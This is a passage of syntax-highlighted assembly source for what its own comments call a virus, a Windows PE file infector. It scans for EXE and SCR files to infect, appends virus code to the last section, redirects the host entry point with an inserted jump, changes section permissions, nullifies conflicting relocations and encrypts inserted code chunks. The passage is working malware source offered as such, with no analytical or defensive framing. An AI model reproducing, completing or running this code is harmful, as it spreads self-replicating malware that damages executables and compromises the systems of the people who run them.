        </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">                  </span><span class="sc1">;yea, no more relocation blockz, return</span><span class="sc0">

</span><span class="sc5">Process_File3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;this function copies a filename to an internal buffer</span><span class="sc0">
                </span><span class="sc1">;  and checks the extension thru a list of infectable</span><span class="sc0">
                </span><span class="sc1">;  extensions (EXE and SCR filez for the moment). If</span><span class="sc0">
                </span><span class="sc1">;  the extension matches, the file will be infected.</span><span class="sc0">
        </span><span class="sc5">@copysz</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0FF202020h</span><span class="sc0">              </span><span class="sc1">;upercase mask</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;get filename extension</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Exts</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get pointer to list of extensionz</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;convert file extension to upercase</span><span class="sc0">

</span><span class="sc5">next_ext</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;get extension from list</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">;no more extensionz?</span><span class="sc0">
        </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">end_PF3</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;convert extension to upercase</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;do extensionz match?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">next_ext</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">end_PF3</span><span class="sc0">                 </span><span class="sc1">;no, get next extension</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Process_File2</span><span class="sc0">           </span><span class="sc1">;yes, extensionz match, infect file</span><span class="sc0">

</span><span class="sc5">end_PF3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">err_Rva2Raw</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">   </span><span class="sc1">;needed to unwind the stack from some function</span><span class="sc0">

</span><span class="sc5">err_Rva2Raw2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">   </span><span class="sc1">;needed to unwind the stack from some function</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Attach</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">;attach virus code to last section in the PE file and</span><span class="sc0">
                </span><span class="sc1">;  change section characteristicz to reflect infection.</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  ECX = base of memory-maped file</span><span class="sc0">
                </span><span class="sc1">;  EDI = original file size</span><span class="sc0">
                </span><span class="sc1">;on exit:</span><span class="sc0">
                </span><span class="sc1">;  EDI = new file size</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;get base of PE header + 3Ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pcode_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get start adress of virus code</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0">      \       </span><span class="sc1">;get built-in image base</span><span class="sc0">
                        </span><span class="sc5">.OH_ImageBase</span><span class="sc0">           \
                        </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                                          </span><span class="sc1">;save valuez to stack</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader</span><span class="sc0">     \       </span><span class="sc1">;get number of sectionz</span><span class="sc0">
                      </span><span class="sc5">.FH_NumberOfSections</span><span class="sc0">      \
                      </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader</span><span class="sc0">  \       </span><span class="sc1">;get first section header</span><span class="sc0">
                       </span><span class="sc5">.FH_SizeOfOptionalHeader</span><span class="sc0"> \
                       </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">err_Rva2Raw2</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MZ_lfanew</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader.OH_SectionAlignment</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader.OH_FileAlignment</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;check SectionAlignment and FileAlignment fieldz</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10000h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">err_Rva2Raw2</span><span class="sc0">            </span><span class="sc1">;too large?</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;get end of file in MM-file</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">err_Rva2Raw2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.SH_VirtualAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;get MM-file base address</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;get new RVA entry point</span><span class="sc0">

</span><span class="sc1">;at this point:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; cPushad.EAX = source adress of code to copy (start at encrypted stringz)</span><span class="sc0">
</span><span class="sc1">; cPushad.EBX = embedded (in PE header) host base address</span><span class="sc0">
</span><span class="sc1">;         EBP = start of MM-file. Base address of MM-file</span><span class="sc0">
</span><span class="sc1">;         EAX = new RVA entry point (start of virus code RVA)</span><span class="sc0">
</span><span class="sc1">;         EDX = file alignment - 1</span><span class="sc0">
</span><span class="sc1">;         EDI = target adress where code will be copied to in the MM-File</span><span class="sc0">
</span><span class="sc1">;         ECX = start adress of last section in the MM-file</span><span class="sc0">
</span><span class="sc1">;         EBX = start adress of last section header (plus section header size)</span><span class="sc0">
</span><span class="sc1">;                 in the MM-file</span><span class="sc0">
</span><span class="sc1">;         ESI = start of PE header (+ 3Ch) in the MM-file</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0">      \       </span><span class="sc1">;get current entry point</span><span class="sc0">
                        </span><span class="sc5">.OH_AddressOfEntryPoint</span><span class="sc0"> \
                        </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;on entry:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  EAX = Host EntryPoint RVA</span><span class="sc0">
</span><span class="sc1">;  EBP = start of MZ header (start of MM-file)</span><span class="sc0">
</span><span class="sc1">;  ESI = start of PE header + 3Ch (in MM-file)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Rva2Raw</span><span class="sc0">         </span><span class="sc1">;find true code section (clue: EntryPoint RVA points inside)</span><span class="sc0">

</span><span class="sc1">;on exit:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  EBP = raw size of CODE section</span><span class="sc0">
</span><span class="sc1">;  EBX = raw start of CODE section</span><span class="sc0">
</span><span class="sc1">;  ECX = 0, if not found</span><span class="sc0">
</span><span class="sc1">;        start of CODE section header (+ section header size), if found</span><span class="sc0">
</span><span class="sc1">;  EDX = start of CODE section RVA</span><span class="sc0">
</span><span class="sc1">;  ESI = relative delta of RVA inside CODE section.</span><span class="sc0">

        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">err_Rva2Raw</span><span class="sc0">     </span><span class="sc1">;code section not found, invalid EntryPoint</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebp.</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">cPushad</span><span class="sc4">)</span><span class="sc5">.Pushad_ebp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get original ebp</span><span class="sc0">
        </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.SH_Characteristics.hiw.hib</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">  </span><span class="sc1">;set exec bit to section</span><span class="sc0">

</span><span class="sc5">exec_set</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ImportHdr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get import section header</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">;is import table inside code section?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">IT_in_Code</span><span class="sc0">                      </span><span class="sc1">;yea, jump</span><span class="sc0">

        </span><span class="sc1">;import table NOT inside code section (i.e. probably exists an .idata section)</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics.hiw.hib</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">       </span><span class="sc1">;set writable bit</span><span class="sc0">

</span><span class="sc5">IT_in_Code</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;import table is inside code section (stupid microsoft)</span><span class="sc0">
                </span><span class="sc1">;no need to set the writable bit (the exec bit does the job)</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;need this value l8r, push it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0B2FD26A3h</span><span class="sc0">
</span><span class="sc5">sub_1st_val</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;add edi,5</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;ax = 5</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">;al = E9h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebp.cPushad.Pushad_eax</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get RVA start of virus code</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebp.Pushad_eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;sub eax,5</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">;0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebp.Pushad_eax</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">nulify_relocs</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;nulify relocs that could overwrite our inserted chunks of code..</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebp.cPushad.Pushad_esi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get PE header (+ 3Ch)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0">      \ </span><span class="sc1">;get size of relocation blockz</span><span class="sc0">
                        </span><span class="sc5">.OH_DirectoryEntries</span><span class="sc0">    \
                        </span><span class="sc5">.DE_BaseReloc</span><span class="sc0">           \
                        </span><span class="sc5">.DD_Size</span><span class="sc0">                \
                        </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">go_popad</span><span class="sc0">                </span><span class="sc1">;no relocationz, jump</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;save size of this chunk of code temporarily</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">ebp.cPushad.Pushad_ebp</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get base of MM-file (MZ header)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0">      \ </span><span class="sc1">;get RVA start of relocation blockz</span><span class="sc0">
                        </span><span class="sc5">.OH_DirectoryEntries</span><span class="sc0">    \
                        </span><span class="sc5">.DE_BaseReloc</span><span class="sc0">           \
                        </span><span class="sc5">.DD_VirtualAddress</span><span class="sc0">      \
                        </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Rva2Raw</span><span class="sc0">                 </span><span class="sc1">;convert RVA to a raw offset inside the section</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;retrieve size of this chunk of code temporarily</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">go_popad</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mark_reloc</span><span class="sc0">      </span><span class="sc1">;pass nul_relocs as a parameter to get_relocs function</span><span class="sc0">

</span><span class="sc5">nul_relocs</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">;get relocation item</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc0"> </span><span class="sc5">IMAGE_REL_BASED_HIGHLOW</span><span class="sc0">    </span><span class="sc1">;check relocation type</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">n_next_reloc</span><span class="sc0">                    </span><span class="sc1">;not valid, get next relocation item</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">;strip or blank relocation type field from relocation item</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;convert relocation pointer to RVA</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;check if relocation points to our chunk of code..</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">n_next_reloc</span><span class="sc0">                    </span><span class="sc1">;check low boundary</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;check high boundary</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">n_next_reloc</span><span class="sc0">                    </span><span class="sc1">;it doesnt point to our chunk of code, get next relocation item</span><span class="sc0">

        </span><span class="sc1">;this relocation item is pointing inside our chunk of code..</span><span class="sc0">
        </span><span class="sc1">;nulify and mark it!</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.hib</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">RD_RelocType</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;nulify relocation!</span><span class="sc0">

</span><span class="sc5">n_next_reloc</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">nul_relocs</span><span class="sc0">                      </span><span class="sc1">;get next relocation item</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mark_reloc</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_relocs</span><span class="sc0">

</span><span class="sc5">go_popad</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;size of this chunk of code</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebp.Pushad_ebx</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;convert RVA start of chunk of code to a raw value</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebp.Pushad_edx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">pre_crypt</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;encrypt chunk of code..</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06Ah</span><span class="sc0">
</span><span class="sc5">_xor_2nd_val</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">pre_crypt</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">;get next chunk of code</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;no more chunkz?</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">pre_crypt_done</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;point EDI to next chunk</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nulify_relocs</span><span class="sc0">           </span><span class="sc1">;check relocationz, jump</span><span class="sc0">

</span><span class="sc5">pre_crypt_done</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">0e8h</span><span class="sc0">                </span><span class="sc1">;build 'call' instruction</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
